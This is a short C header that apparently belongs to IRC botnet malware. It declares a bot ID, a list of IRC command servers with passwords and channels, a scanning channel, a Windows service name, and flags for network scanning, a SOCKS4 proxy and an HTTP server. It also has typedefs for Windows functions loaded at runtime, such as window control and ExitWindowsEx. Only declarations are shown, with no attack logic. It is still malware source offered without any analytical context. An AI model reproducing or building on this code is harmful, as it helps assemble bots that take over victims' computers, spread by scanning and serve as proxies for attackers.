extern char botid[128];
extern char server[16][128];
extern char port[128];
extern char serverpass[128];
extern char channel[128];
extern char chankey[128];
extern char hostauth[128];
extern char scanchan[128];
extern char filename[128];
extern char svcname[128];
extern char svclname[128];

extern int transfers;
extern char local_ip[16];
extern char global_ip[16];
extern char global_host[128];
extern struct threads thread[];
extern struct ircs irc;
extern bool scan_active;
extern bool socks4_active;
extern bool httpd_active;

#define NO_MIRCINFO
#define NO_MIRCCMD

BOOL LoadDLLs(void);
typedef LRESULT (__stdcall *SM)(HWND,UINT,WPARAM,LPARAM);
typedef HWND (__stdcall *FW)(LPCTSTR,LPCTSTR);
typedef BOOL (__stdcall *IW)(HWND);
typedef BOOL (__stdcall *DW)(HWND);
typedef BOOL (__stdcall *CW)(HWND);
typedef BOOL (__stdcall *OC)(HWND);
typedef HANDLE (__stdcall *GCD)(UINT);
typedef BOOL (__stdcall *CC)(VOID);
typedef BOOL (__stdcall *EWE)(UINT,DWORD);